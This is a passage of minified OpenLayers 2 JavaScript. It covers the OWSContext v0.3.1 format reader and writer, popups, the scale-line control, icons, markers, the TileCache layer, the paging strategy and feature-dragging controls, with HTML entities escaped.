a.layersContext[b],e=[],f=a.title||"";a.metadata&amp;&amp;a.metadata.nestingPath&amp;&amp;(e=a.metadata.nestingPath.slice());""!=f&amp;&amp;e.push(f);d.metadata.nestingPath=e;d.layersContext&amp;&amp;this.setNestingPath(d)}},decomposeNestingPath:function(a){var b=[];if(OpenLayers.Util.isArray(a)){for(a=a.slice();0&lt;a.length;)b.push(a.slice()),a.pop();b.reverse()}return b},read:function(a){"string"==typeof a&amp;&amp;(a=OpenLayers.Format.XML.prototype.read.apply(this,[a]));a&amp;&amp;9==a.nodeType&amp;&amp;(a=a.documentElement);var b={};this.readNode(a, b);this.setNestingPath({layersContext:b.layersContext});a=[];this.processLayer(a,b);delete b.layersContext;b.layersContext=a;return b},processLayer:function(a,b){if(b.layersContext)for(var c=0,d=b.layersContext.length;c&lt;d;c++){var e=b.layersContext[c];a.push(e);e.layersContext&amp;&amp;this.processLayer(a,e)}},write:function(a,b){this.nestingLayerLookup={};b=b||{};OpenLayers.Util.applyDefaults(b,a);var c=this.writeNode("OWSContext",b);this.nestingLayerLookup=null;this.setAttributeNS(c,this.namespaces.xsi, "xsi:schemaLocation",this.schemaLocation);return OpenLayers.Format.XML.prototype.write.apply(this,[c])},readers:{kml:{Document:function(a,b){b.features=(new OpenLayers.Format.KML({kmlns:this.namespaces.kml,extractStyles:!0})).read(a)}},owc:{OWSContext:function(a,b){this.readChildNodes(a,b)},General:function(a,b){this.readChildNodes(a,b)},ResourceList:function(a,b){this.readChildNodes(a,b)},Layer:function(a,b){var c={metadata:{},visibility:"1"!=a.getAttribute("hidden"),queryable:"1"==a.getAttribute("queryable"), opacity:null!=a.getAttribute("opacity")?parseFloat(a.getAttribute("opacity")):null,name:a.getAttribute("name"),categoryLayer:null==a.getAttribute("name"),formats:[],styles:[]};b.layersContext||(b.layersContext=[]);b.layersContext.push(c);this.readChildNodes(a,c)},InlineGeometry:function(a,b){b.features=[];var c=this.getElementsByTagNameNS(a,this.namespaces.gml,"featureMember"),d;1&lt;=c.length&amp;&amp;(d=c[0]);d&amp;&amp;d.firstChild&amp;&amp;(c=d.firstChild.nextSibling?d.firstChild.nextSibling:d.firstChild,this.setNamespace("feature", c.namespaceURI),this.featureType=c.localName||c.nodeName.split(":").pop(),this.readChildNodes(a,b))},Server:function(a,b){if(!b.service&amp;&amp;!b.version||b.service!=OpenLayers.Format.Context.serviceTypes.WMS)b.service=a.getAttribute("service"),b.version=a.getAttribute("version"),this.readChildNodes(a,b)},Name:function(a,b){b.name=this.getChildValue(a);this.readChildNodes(a,b)},Title:function(a,b){b.title=this.getChildValue(a);this.readChildNodes(a,b)},StyleList:function(a,b){this.readChildNodes(a,b.styles)}, Style:function(a,b){var c={};b.push(c);this.readChildNodes(a,c)},LegendURL:function(a,b){var c={};b.legend=c;this.readChildNodes(a,c)},OnlineResource:function(a,b){b.url=this.getAttributeNS(a,this.namespaces.xlink,"href");this.readChildNodes(a,b)}},ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.readers.ows,gml:OpenLayers.Format.GML.v2.prototype.readers.gml,sld:OpenLayers.Format.SLD.v1_0_0.prototype.readers.sld,feature:OpenLayers.Format.GML.v2.prototype.readers.feature},writers:{owc:{OWSContext:function(a){var b= this.createElementNSPlus("OWSContext",{attributes:{version:this.VERSION,id:a.id||OpenLayers.Util.createUniqueID("OpenLayers_OWSContext_")}});this.writeNode("General",a,b);this.writeNode("ResourceList",a,b);return b},General:function(a){var b=this.createElementNSPlus("General");this.writeNode("ows:BoundingBox",a,b);this.writeNode("ows:Title",a.title||"OpenLayers OWSContext",b);return b},ResourceList:function(a){for(var b=this.createElementNSPlus("ResourceList"),c=0,d=a.layers.length;c&lt;d;c++){var e= a.layers[c],f=this.decomposeNestingPath(e.metadata.nestingPath);this.writeNode("_Layer",{layer:e,subPaths:f},b)}return b},Server:function(a){var b=this.createElementNSPlus("Server",{attributes:{version:a.version,service:a.service}});this.writeNode("OnlineResource",a,b);return b},OnlineResource:function(a){return this.createElementNSPlus("OnlineResource",{attributes:{"xlink:href":a.url}})},InlineGeometry:function(a){var b=this.createElementNSPlus("InlineGeometry"),c=a.getDataExtent();null!==c&amp;&amp;this.writeNode("gml:boundedBy", c,b);for(var c=0,d=a.features.length;c&lt;d;c++)this.writeNode("gml:featureMember",a.features[c],b);return b},StyleList:function(a){for(var b=this.createElementNSPlus("StyleList"),c=0,d=a.length;c&lt;d;c++)this.writeNode("Style",a[c],b);return b},Style:function(a){var b=this.createElementNSPlus("Style");this.writeNode("Name",a,b);this.writeNode("Title",a,b);a.legend&amp;&amp;this.writeNode("LegendURL",a,b);return b},Name:function(a){return this.createElementNSPlus("Name",{value:a.name})},Title:function(a){return this.createElementNSPlus("Title", {value:a.title})},LegendURL:function(a){var b=this.createElementNSPlus("LegendURL");this.writeNode("OnlineResource",a.legend,b);return b},_WMS:function(a){var b=this.createElementNSPlus("Layer",{attributes:{name:a.params.LAYERS,queryable:a.queryable?"1":"0",hidden:a.visibility?"0":"1",opacity:a.hasOwnProperty("opacity")?a.opacity:null}});this.writeNode("ows:Title",a.name,b);this.writeNode("ows:OutputFormat",a.params.FORMAT,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.WMS, version:a.params.VERSION,url:a.url},b);a.metadata.styles&amp;&amp;0&lt;a.metadata.styles.length&amp;&amp;this.writeNode("StyleList",a.metadata.styles,b);return b},_Layer:function(a){var b,c,d;b=a.layer;c=a.subPaths;d=null;0&lt;c.length?(b=c[0].join("/"),c=b.lastIndexOf("/"),d=this.nestingLayerLookup[b],c=0&lt;c?b.substring(c+1,b.length):b,d||(d=this.createElementNSPlus("Layer"),this.writeNode("ows:Title",c,d),this.nestingLayerLookup[b]=d),a.subPaths.shift(),this.writeNode("_Layer",a,d)):(b instanceof OpenLayers.Layer.WMS? d=this.writeNode("_WMS",b):b instanceof OpenLayers.Layer.Vector&amp;&amp;(b.protocol instanceof OpenLayers.Protocol.WFS.v1?d=this.writeNode("_WFS",b):b.protocol instanceof OpenLayers.Protocol.HTTP?b.protocol.format instanceof OpenLayers.Format.GML?(b.protocol.format.version="2.1.2",d=this.writeNode("_GML",b)):b.protocol.format instanceof OpenLayers.Format.KML&amp;&amp;(b.protocol.format.version="2.2",d=this.writeNode("_KML",b)):(this.setNamespace("feature",this.featureNS),d=this.writeNode("_InlineGeometry",b))), b.options.maxScale&amp;&amp;this.writeNode("sld:MinScaleDenominator",b.options.maxScale,d),b.options.minScale&amp;&amp;this.writeNode("sld:MaxScaleDenominator",b.options.minScale,d),this.nestingLayerLookup[b.name]=d);return d},_WFS:function(a){var b=this.createElementNSPlus("Layer",{attributes:{name:a.protocol.featurePrefix+":"+a.protocol.featureType,hidden:a.visibility?"0":"1"}});this.writeNode("ows:Title",a.name,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.WFS,version:a.protocol.version, url:a.protocol.url},b);return b},_InlineGeometry:function(a){var b=this.createElementNSPlus("Layer",{attributes:{name:this.featureType,hidden:a.visibility?"0":"1"}});this.writeNode("ows:Title",a.name,b);this.writeNode("InlineGeometry",a,b);return b},_GML:function(a){var b=this.createElementNSPlus("Layer");this.writeNode("ows:Title",a.name,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.GML,url:a.protocol.url,version:a.protocol.format.version},b);return b},_KML:function(a){var b= this.createElementNSPlus("Layer");this.writeNode("ows:Title",a.name,b);this.writeNode("Server",{service:OpenLayers.Format.Context.serviceTypes.KML,version:a.protocol.format.version,url:a.protocol.url},b);return b}},gml:OpenLayers.Util.applyDefaults({boundedBy:function(a){var b=this.createElementNSPlus("gml:boundedBy");this.writeNode("gml:Box",a,b);return b}},OpenLayers.Format.GML.v2.prototype.writers.gml),ows:OpenLayers.Format.OWSCommon.v1_0_0.prototype.writers.ows,sld:OpenLayers.Format.SLD.v1_0_0.prototype.writers.sld, feature:OpenLayers.Format.GML.v2.prototype.writers.feature},CLASS_NAME:"OpenLayers.Format.OWSContext.v0_3_1"});OpenLayers.Popup=OpenLayers.Class({events:null,id:"",lonlat:null,div:null,contentSize:null,size:null,contentHTML:null,backgroundColor:"",opacity:"",border:"",contentDiv:null,groupDiv:null,closeDiv:null,autoSize:!1,minSize:null,maxSize:null,displayClass:"olPopup",contentDisplayClass:"olPopupContent",padding:0,disableFirefoxOverflowHack:!1,fixPadding:function(){"number"==typeof this.padding&amp;&amp;(this.padding=new OpenLayers.Bounds(this.padding,this.padding,this.padding,this.padding))},panMapIfOutOfView:!1, keepInMap:!1,closeOnMove:!1,map:null,initialize:function(a,b,c,d,e,f){null==a&amp;&amp;(a=OpenLayers.Util.createUniqueID(this.CLASS_NAME+"_"));this.id=a;this.lonlat=b;this.contentSize=null!=c?c:new OpenLayers.Size(OpenLayers.Popup.WIDTH,OpenLayers.Popup.HEIGHT);null!=d&amp;&amp;(this.contentHTML=d);this.backgroundColor=OpenLayers.Popup.COLOR;this.opacity=OpenLayers.Popup.OPACITY;this.border=OpenLayers.Popup.BORDER;this.div=OpenLayers.Util.createDiv(this.id,null,null,null,null,null,"hidden");this.div.className=this.displayClass; this.groupDiv=OpenLayers.Util.createDiv(this.id+"_GroupDiv",null,null,null,"relative",null,"hidden");a=this.div.id+"_contentDiv";this.contentDiv=OpenLayers.Util.createDiv(a,null,this.contentSize.clone(),null,"relative");this.contentDiv.className=this.contentDisplayClass;this.groupDiv.appendChild(this.contentDiv);this.div.appendChild(this.groupDiv);e&amp;&amp;this.addCloseBox(f);this.registerEvents()},destroy:function(){this.border=this.opacity=this.backgroundColor=this.contentHTML=this.size=this.lonlat=this.id= null;this.closeOnMove&amp;&amp;this.map&amp;&amp;this.map.events.unregister("movestart",this,this.hide);this.events.destroy();this.events=null;this.closeDiv&amp;&amp;(OpenLayers.Event.stopObservingElement(this.closeDiv),this.groupDiv.removeChild(this.closeDiv));this.closeDiv=null;this.div.removeChild(this.groupDiv);this.groupDiv=null;null!=this.map&amp;&amp;this.map.removePopup(this);this.panMapIfOutOfView=this.padding=this.maxSize=this.minSize=this.autoSize=this.div=this.map=null},draw:function(a){null==a&amp;&amp;null!=this.lonlat&amp;&amp;null!= this.map&amp;&amp;(a=this.map.getLayerPxFromLonLat(this.lonlat));this.closeOnMove&amp;&amp;this.map.events.register("movestart",this,this.hide);this.disableFirefoxOverflowHack||"firefox"!=OpenLayers.BROWSER_NAME||(this.map.events.register("movestart",this,function(){var a=document.defaultView.getComputedStyle(this.contentDiv,null).getPropertyValue("overflow");"hidden"!=a&amp;&amp;(this.contentDiv._oldOverflow=a,this.contentDiv.style.overflow="hidden")}),this.map.events.register("moveend",this,function(){var a=this.contentDiv._oldOverflow; a&amp;&amp;(this.contentDiv.style.overflow=a,this.contentDiv._oldOverflow=null)}));this.moveTo(a);this.autoSize||this.size||this.setSize(this.contentSize);this.setBackgroundColor();this.setOpacity();this.setBorder();this.setContentHTML();this.panMapIfOutOfView&amp;&amp;this.panIntoView();return this.div},updatePosition:function(){if(this.lonlat&amp;&amp;this.map){var a=this.map.getLayerPxFromLonLat(this.lonlat);a&amp;&amp;this.moveTo(a)}},moveTo:function(a){null!=a&amp;&amp;null!=this.div&amp;&amp;(this.div.style.left=a.x+"px",this.div.style.top= a.y+"px")},visible:function(){return OpenLayers.Element.visible(this.div)},toggle:function(){this.visible()?this.hide():this.show()},show:function(){this.div.style.display="";this.panMapIfOutOfView&amp;&amp;this.panIntoView()},hide:function(){this.div.style.display="none"},setSize:function(a){this.size=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width), c=c+(e+b.right);this.size.w+=c;this.size.h+=d;"msie"==OpenLayers.BROWSER_NAME&amp;&amp;(this.contentSize.w+=b.left+b.right,this.contentSize.h+=b.bottom+b.top);null!=this.div&amp;&amp;(this.div.style.width=this.size.w+"px",this.div.style.height=this.size.h+"px");null!=this.contentDiv&amp;&amp;(this.contentDiv.style.width=a.w+"px",this.contentDiv.style.height=a.h+"px")},updateSize:function(){var a="&lt;div class='"+this.contentDisplayClass+"'>"+this.contentDiv.innerHTML+"&lt;/div>",b=this.map?this.map.div:document.body,c=OpenLayers.Util.getRenderedDimensions(a, null,{displayClass:this.displayClass,containerElement:b}),d=this.getSafeContentSize(c),e=null;d.equals(c)?e=c:(c={w:d.w&lt;c.w?d.w:null,h:d.h&lt;c.h?d.h:null},c.w&amp;&amp;c.h?e=d:(a=OpenLayers.Util.getRenderedDimensions(a,c,{displayClass:this.contentDisplayClass,containerElement:b}),"hidden"!=OpenLayers.Element.getStyle(this.contentDiv,"overflow")&amp;&amp;a.equals(d)&amp;&amp;(d=OpenLayers.Util.getScrollbarWidth(),c.w?a.h+=d:a.w+=d),e=this.getSafeContentSize(a)));this.setSize(e)},setBackgroundColor:function(a){void 0!=a&amp;&amp;(this.backgroundColor= a);null!=this.div&amp;&amp;(this.div.style.backgroundColor=this.backgroundColor)},setOpacity:function(a){void 0!=a&amp;&amp;(this.opacity=a);null!=this.div&amp;&amp;(this.div.style.opacity=this.opacity,this.div.style.filter="alpha(opacity="+100*this.opacity+")")},setBorder:function(a){void 0!=a&amp;&amp;(this.border=a);null!=this.div&amp;&amp;(this.div.style.border=this.border)},setContentHTML:function(a){null!=a&amp;&amp;(this.contentHTML=a);null!=this.contentDiv&amp;&amp;(null!=this.contentHTML&amp;&amp;this.contentHTML!=this.contentDiv.innerHTML)&amp;&amp;(this.contentDiv.innerHTML= this.contentHTML,this.autoSize&amp;&amp;(this.registerImageListeners(),this.updateSize()))},registerImageListeners:function(){for(var a=function(){null!==this.popup.id&amp;&amp;(this.popup.updateSize(),this.popup.visible()&amp;&amp;this.popup.panMapIfOutOfView&amp;&amp;this.popup.panIntoView(),OpenLayers.Event.stopObserving(this.img,"load",this.img._onImgLoad))},b=this.contentDiv.getElementsByTagName("img"),c=0,d=b.length;c&lt;d;c++){var e=b[c];if(0==e.width||0==e.height)e._onImgLoad=OpenLayers.Function.bind(a,{popup:this,img:e}), OpenLayers.Event.observe(e,"load",e._onImgLoad)}},getSafeContentSize:function(a){a=a.clone();var b=this.getContentDivPadding(),c=b.left+b.right,d=b.top+b.bottom;this.fixPadding();c+=this.padding.left+this.padding.right;d+=this.padding.top+this.padding.bottom;if(this.closeDiv)var e=parseInt(this.closeDiv.style.width),c=c+(e+b.right);this.minSize&amp;&amp;(a.w=Math.max(a.w,this.minSize.w-c),a.h=Math.max(a.h,this.minSize.h-d));this.maxSize&amp;&amp;(a.w=Math.min(a.w,this.maxSize.w-c),a.h=Math.min(a.h,this.maxSize.h- d));if(this.map&amp;&amp;this.map.size){e=b=0;if(this.keepInMap&amp;&amp;!this.panMapIfOutOfView)switch(e=this.map.getPixelFromLonLat(this.lonlat),this.relativePosition){case "tr":b=e.x;e=this.map.size.h-e.y;break;case "tl":b=this.map.size.w-e.x;e=this.map.size.h-e.y;break;case "bl":b=this.map.size.w-e.x;e=e.y;break;case "br":b=e.x;e=e.y;break;default:b=e.x,e=this.map.size.h-e.y}d=this.map.size.h-this.map.paddingForPopups.top-this.map.paddingForPopups.bottom-d-e;a.w=Math.min(a.w,this.map.size.w-this.map.paddingForPopups.left- this.map.paddingForPopups.right-c-b);a.h=Math.min(a.h,d)}return a},getContentDivPadding:function(){var a=this._contentDivPadding;a||(null==this.div.parentNode&amp;&amp;(this.div.style.display="none",document.body.appendChild(this.div)),this._contentDivPadding=a=new OpenLayers.Bounds(OpenLayers.Element.getStyle(this.contentDiv,"padding-left"),OpenLayers.Element.getStyle(this.contentDiv,"padding-bottom"),OpenLayers.Element.getStyle(this.contentDiv,"padding-right"),OpenLayers.Element.getStyle(this.contentDiv, "padding-top")),this.div.parentNode==document.body&amp;&amp;(document.body.removeChild(this.div),this.div.style.display=""));return a},addCloseBox:function(a){this.closeDiv=OpenLayers.Util.createDiv(this.id+"_close",null,{w:17,h:17});this.closeDiv.className="olPopupCloseBox";var b=this.getContentDivPadding();this.closeDiv.style.right=b.right+"px";this.closeDiv.style.top=b.top+"px";this.groupDiv.appendChild(this.closeDiv);a=a||function(a){this.hide();OpenLayers.Event.stop(a)};OpenLayers.Event.observe(this.closeDiv, "touchend",OpenLayers.Function.bindAsEventListener(a,this));OpenLayers.Event.observe(this.closeDiv,"click",OpenLayers.Function.bindAsEventListener(a,this))},panIntoView:function(){var a=this.map.getSize(),b=this.map.getViewPortPxFromLayerPx(new OpenLayers.Pixel(parseInt(this.div.style.left),parseInt(this.div.style.top))),c=b.clone();b.x&lt;this.map.paddingForPopups.left?c.x=this.map.paddingForPopups.left:b.x+this.size.w>a.w-this.map.paddingForPopups.right&amp;&amp;(c.x=a.w-this.map.paddingForPopups.right-this.size.w); b.y&lt;this.map.paddingForPopups.top?c.y=this.map.paddingForPopups.top:b.y+this.size.h>a.h-this.map.paddingForPopups.bottom&amp;&amp;(c.y=a.h-this.map.paddingForPopups.bottom-this.size.h);this.map.pan(b.x-c.x,b.y-c.y)},registerEvents:function(){this.events=new OpenLayers.Events(this,this.div,null,!0);this.events.on({mousedown:this.onmousedown,mousemove:this.onmousemove,mouseup:this.onmouseup,click:this.onclick,mouseout:this.onmouseout,dblclick:this.ondblclick,touchstart:function(a){OpenLayers.Event.stop(a,!0)}, scope:this})},onmousedown:function(a){this.mousedown=!0;OpenLayers.Event.stop(a,!0)},onmousemove:function(a){this.mousedown&amp;&amp;OpenLayers.Event.stop(a,!0)},onmouseup:function(a){this.mousedown&amp;&amp;(this.mousedown=!1,OpenLayers.Event.stop(a,!0))},onclick:function(a){OpenLayers.Event.stop(a,!0)},onmouseout:function(a){this.mousedown=!1},ondblclick:function(a){OpenLayers.Event.stop(a,!0)},CLASS_NAME:"OpenLayers.Popup"});OpenLayers.Popup.WIDTH=200;OpenLayers.Popup.HEIGHT=200;OpenLayers.Popup.COLOR="white"; OpenLayers.Popup.OPACITY=1;OpenLayers.Popup.BORDER="0px";OpenLayers.Control.ScaleLine=OpenLayers.Class(OpenLayers.Control,{maxWidth:100,topOutUnits:"km",topInUnits:"m",bottomOutUnits:"mi",bottomInUnits:"ft",eTop:null,eBottom:null,geodesic:!1,draw:function(){OpenLayers.Control.prototype.draw.apply(this,arguments);this.eTop||(this.eTop=document.createElement("div"),this.eTop.className=this.displayClass+"Top",this.div.appendChild(this.eTop),this.eTop.style.visibility=""==this.topOutUnits||""==this.topInUnits?"hidden":"visible",this.eBottom=document.createElement("div"), this.eBottom.className=this.displayClass+"Bottom",this.div.appendChild(this.eBottom),this.eBottom.style.visibility=""==this.bottomOutUnits||""==this.bottomInUnits?"hidden":"visible");this.map.events.register("moveend",this,this.update);this.update();return this.div},getBarLen:function(a){var b=parseInt(Math.log(a)/Math.log(10)),b=Math.pow(10,b);a=parseInt(a/b);return(5&lt;a?5:2&lt;a?2:1)*b},update:function(){var a=this.map.getResolution();if(a){var b=this.map.getUnits(),c=OpenLayers.INCHES_PER_UNIT,d=this.maxWidth* a*c[b],e=1;!0===this.geodesic&amp;&amp;(e=(this.map.getGeodesicPixelSize().w||1E-6)*this.maxWidth/(d/c.km),d*=e);var f,g;1E5&lt;d?(f=this.topOutUnits,g=this.bottomOutUnits):(f=this.topInUnits,g=this.bottomInUnits);var h=d/c[f],k=d/c[g],d=this.getBarLen(h),l=this.getBarLen(k),h=d/c[b]*c[f],k=l/c[b]*c[g],b=h/a/e,a=k/a/e;"visible"==this.eBottom.style.visibility&amp;&amp;(this.eBottom.style.width=Math.round(a)+"px",this.eBottom.innerHTML=l+" "+g);"visible"==this.eTop.style.visibility&amp;&amp;(this.eTop.style.width=Math.round(b)+ "px",this.eTop.innerHTML=d+" "+f)}},CLASS_NAME:"OpenLayers.Control.ScaleLine"});OpenLayers.Icon=OpenLayers.Class({url:null,size:null,offset:null,calculateOffset:null,imageDiv:null,px:null,initialize:function(a,b,c,d){this.url=a;this.size=b||{w:20,h:20};this.offset=c||{x:-(this.size.w/2),y:-(this.size.h/2)};this.calculateOffset=d;a=OpenLayers.Util.createUniqueID("OL_Icon_");this.imageDiv=OpenLayers.Util.createAlphaImageDiv(a)},destroy:function(){this.erase();OpenLayers.Event.stopObservingElement(this.imageDiv.firstChild);this.imageDiv.innerHTML="";this.imageDiv=null},clone:function(){return new OpenLayers.Icon(this.url, this.size,this.offset,this.calculateOffset)},setSize:function(a){null!=a&amp;&amp;(this.size=a);this.draw()},setUrl:function(a){null!=a&amp;&amp;(this.url=a);this.draw()},draw:function(a){OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,this.size,this.url,"absolute");this.moveTo(a);return this.imageDiv},erase:function(){null!=this.imageDiv&amp;&amp;null!=this.imageDiv.parentNode&amp;&amp;OpenLayers.Element.remove(this.imageDiv)},setOpacity:function(a){OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,null,null,null, null,null,null,a)},moveTo:function(a){null!=a&amp;&amp;(this.px=a);null!=this.imageDiv&amp;&amp;(null==this.px?this.display(!1):(this.calculateOffset&amp;&amp;(this.offset=this.calculateOffset(this.size)),OpenLayers.Util.modifyAlphaImageDiv(this.imageDiv,null,{x:this.px.x+this.offset.x,y:this.px.y+this.offset.y})))},display:function(a){this.imageDiv.style.display=a?"":"none"},isDrawn:function(){return this.imageDiv&amp;&amp;this.imageDiv.parentNode&amp;&amp;11!=this.imageDiv.parentNode.nodeType},CLASS_NAME:"OpenLayers.Icon"});OpenLayers.Marker=OpenLayers.Class({icon:null,lonlat:null,events:null,map:null,initialize:function(a,b){this.lonlat=a;var c=b?b:OpenLayers.Marker.defaultIcon();null==this.icon?this.icon=c:(this.icon.url=c.url,this.icon.size=c.size,this.icon.offset=c.offset,this.icon.calculateOffset=c.calculateOffset);this.events=new OpenLayers.Events(this,this.icon.imageDiv)},destroy:function(){this.erase();this.map=null;this.events.destroy();this.events=null;null!=this.icon&amp;&amp;(this.icon.destroy(),this.icon=null)}, draw:function(a){return this.icon.draw(a)},erase:function(){null!=this.icon&amp;&amp;this.icon.erase()},moveTo:function(a){null!=a&amp;&amp;null!=this.icon&amp;&amp;this.icon.moveTo(a);this.lonlat=this.map.getLonLatFromLayerPx(a)},isDrawn:function(){return this.icon&amp;&amp;this.icon.isDrawn()},onScreen:function(){var a=!1;this.map&amp;&amp;(a=this.map.getExtent().containsLonLat(this.lonlat));return a},inflate:function(a){this.icon&amp;&amp;this.icon.setSize({w:this.icon.size.w*a,h:this.icon.size.h*a})},setOpacity:function(a){this.icon.setOpacity(a)}, setUrl:function(a){this.icon.setUrl(a)},display:function(a){this.icon.display(a)},CLASS_NAME:"OpenLayers.Marker"});OpenLayers.Marker.defaultIcon=function(){return new OpenLayers.Icon(OpenLayers.Util.getImageLocation("marker.png"),{w:21,h:25},{x:-10.5,y:-25})};OpenLayers.Layer.TileCache=OpenLayers.Class(OpenLayers.Layer.Grid,{isBaseLayer:!0,format:"image/png",serverResolutions:null,initialize:function(a,b,c,d){this.layername=c;OpenLayers.Layer.Grid.prototype.initialize.apply(this,[a,b,{},d]);this.extension=this.format.split("/")[1].toLowerCase();this.extension="jpg"==this.extension?"jpeg":this.extension},clone:function(a){null==a&amp;&amp;(a=new OpenLayers.Layer.TileCache(this.name,this.url,this.layername,this.getOptions()));return a=OpenLayers.Layer.Grid.prototype.clone.apply(this, [a])},getURL:function(a){var b=this.getServerResolution(),c=this.maxExtent,d=this.tileSize,e=Math.round((a.left-c.left)/(b*d.w));a=Math.round((a.bottom-c.bottom)/(b*d.h));b=null!=this.serverResolutions?OpenLayers.Util.indexOf(this.serverResolutions,b):this.map.getZoom();e=[this.layername,OpenLayers.Number.zeroPad(b,2),OpenLayers.Number.zeroPad(parseInt(e/1E6),3),OpenLayers.Number.zeroPad(parseInt(e/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(e)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a/1E6), 3),OpenLayers.Number.zeroPad(parseInt(a/1E3)%1E3,3),OpenLayers.Number.zeroPad(parseInt(a)%1E3,3)+"."+this.extension].join("/");b=this.url;OpenLayers.Util.isArray(b)&amp;&amp;(b=this.selectUrl(e,b));b="/"==b.charAt(b.length-1)?b:b+"/";return b+e},CLASS_NAME:"OpenLayers.Layer.TileCache"});OpenLayers.Strategy.Paging=OpenLayers.Class(OpenLayers.Strategy,{features:null,length:10,num:null,paging:!1,activate:function(){var a=OpenLayers.Strategy.prototype.activate.call(this);if(a)this.layer.events.on({beforefeaturesadded:this.cacheFeatures,scope:this});return a},deactivate:function(){var a=OpenLayers.Strategy.prototype.deactivate.call(this);a&amp;&amp;(this.clearCache(),this.layer.events.un({beforefeaturesadded:this.cacheFeatures,scope:this}));return a},cacheFeatures:function(a){this.paging||(this.clearCache(), this.features=a.features,this.pageNext(a))},clearCache:function(){if(this.features)for(var a=0;a&lt;this.features.length;++a)this.features[a].destroy();this.num=this.features=null},pageCount:function(){return Math.ceil((this.features?this.features.length:0)/this.length)},pageNum:function(){return this.num},pageLength:function(a){a&amp;&amp;0&lt;a&amp;&amp;(this.length=a);return this.length},pageNext:function(a){var b=!1;this.features&amp;&amp;(null===this.num&amp;&amp;(this.num=-1),b=this.page((this.num+1)*this.length,a));return b},pagePrevious:function(){var a= !1;this.features&amp;&amp;(null===this.num&amp;&amp;(this.num=this.pageCount()),a=this.page((this.num-1)*this.length));return a},page:function(a,b){var c=!1;if(this.features&amp;&amp;0&lt;=a&amp;&amp;a&lt;this.features.length){var d=Math.floor(a/this.length);d!=this.num&amp;&amp;(this.paging=!0,c=this.features.slice(a,a+this.length),this.layer.removeFeatures(this.layer.features),this.num=d,b&amp;&amp;b.features?b.features=c:this.layer.addFeatures(c),this.paging=!1,c=!0)}return c},CLASS_NAME:"OpenLayers.Strategy.Paging"});OpenLayers.Control.DragFeature=OpenLayers.Class(OpenLayers.Control,{geometryTypes:null,onStart:function(a,b){},onDrag:function(a,b){},onComplete:function(a,b){},onEnter:function(a){},onLeave:function(a){},documentDrag:!1,layer:null,feature:null,dragCallbacks:{},featureCallbacks:{},lastPixel:null,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.handlers={drag:new OpenLayers.Handler.Drag(this,OpenLayers.Util.extend({down:this.downFeature,move:this.moveFeature, up:this.upFeature,out:this.cancel,done:this.doneDragging},this.dragCallbacks),{documentDrag:this.documentDrag}),feature:new OpenLayers.Handler.Feature(this,this.layer,OpenLayers.Util.extend({click:this.clickFeature,clickout:this.clickoutFeature,over:this.overFeature,out:this.outFeature},this.featureCallbacks),{geometryTypes:this.geometryTypes})}},clickFeature:function(a){this.handlers.feature.touch&amp;&amp;(!this.over&amp;&amp;this.overFeature(a))&amp;&amp;(this.handlers.drag.dragstart(this.handlers.feature.evt),this.handlers.drag.stopDown= !1)},clickoutFeature:function(a){this.handlers.feature.touch&amp;&amp;this.over&amp;&amp;(this.outFeature(a),this.handlers.drag.stopDown=!0)},destroy:function(){this.layer=null;OpenLayers.Control.prototype.destroy.apply(this,[])},activate:function(){return this.handlers.feature.activate()&amp;&amp;OpenLayers.Control.prototype.activate.apply(this,arguments)},deactivate:function(){this.handlers.drag.deactivate();this.handlers.feature.deactivate();this.feature=null;this.dragging=!1;this.lastPixel=null;OpenLayers.Element.removeClass(this.map.viewPortDiv, this.displayClass+"Over");return OpenLayers.Control.prototype.deactivate.apply(this,arguments)},overFeature:function(a){var b=!1;this.handlers.drag.dragging?this.over=this.feature.id==a.id?!0:!1:(this.feature=a,this.handlers.drag.activate(),this.over=b=!0,OpenLayers.Element.addClass(this.map.viewPortDiv,this.displayClass+"Over"),this.onEnter(a));return b},downFeature:function(a){this.lastPixel=a;this.onStart(this.feature,a)},moveFeature:function(a){var b=this.map.getResolution();this.feature.geometry.move(b* (a.x-this.lastPixel.x),b*(this.lastPixel.y-a.y));this.layer.drawFeature(this.feature);this.lastPixel=a;this.onDrag(this.feature,a)},upFeature:function(a){this.over||this.handlers.drag.deactivate()},doneDragging:function(a){this.onComplete(this.feature,a)},outFeature:function(a){this.handlers.drag.dragging?this.feature.id==a.id&amp;&amp;(this.over=!1):(this.over=!1,this.handlers.drag.deactivate(),OpenLayers.Element.removeClass(this.map.viewPortDiv,this.displayClass+"Over"),this.onLeave(a),this.feature=null)}, cancel:function(){this.handlers.drag.deactivate();this.over=!1},setMap:function(a){this.handlers.drag.setMap(a);this.handlers.feature.setMap(a);OpenLayers.Control.prototype.setMap.apply(this,arguments)},CLASS_NAME:"OpenLayers.Control.DragFeature"});OpenLayers.Control.TransformFeature=OpenLayers.Class(OpenLayers.Control,{geometryTypes:null,layer:null,preserveAspectRatio:!1,rotate:!0,feature:null,renderIntent:"temporary",rotationHandleSymbolizer:null,box:null,center:null,scale:1,ratio:1,rotation:0,handles:null,rotationHandles:null,dragControl:null,irregular:!1,initialize:function(a,b){OpenLayers.Control.prototype.initialize.apply(this,[b]);this.layer=a;this.rotationHandleSymbolizer||(this.rotationHandleSymbolizer={stroke:!1,pointRadius:10,fillOpacity:0, cursor:"pointer"});this.createBox();this.createControl()},activate:function(){var a=!1;OpenLayers.Control.prototype.activate.apply(this,arguments)&amp;&amp;(this.dragControl.activate(),this.layer.addFeatures([this.box]),this.rotate&amp;&amp;this.layer.addFeatures(this.rotationHandles),this.layer.addFeatures(this.handles),a=!0);return a},deactivate:function(){var a=!1;OpenLayers.Control.prototype.deactivate.apply(this,arguments)&amp;&amp;(this.layer.removeFeatures(this.handles),this.rotate&amp;&amp;this.layer.removeFeatures(this.rotationHandles), this.layer.removeFeatures([this.box]),this.dragControl.deactivate(),a=!0);return 